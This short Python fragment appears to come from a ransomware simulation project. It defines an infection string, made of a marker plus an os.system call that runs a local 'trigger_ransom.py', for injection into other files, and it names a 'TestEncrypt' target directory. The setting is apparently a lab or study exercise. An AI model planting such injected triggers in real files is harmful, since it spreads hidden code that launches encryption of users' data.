...
INJECTION_CODE = (
    f"{INFECTION_MARKER}\n"
    "import os\n"
    "os.system('python3 /home/neriyajacobsen/ByteMeProject/backend/src/modules/simulation/trigger_ransom.py')\n"
)

TARGET_DIR = "/home/neriyajacobsen/Desktop/TestEncrypt"
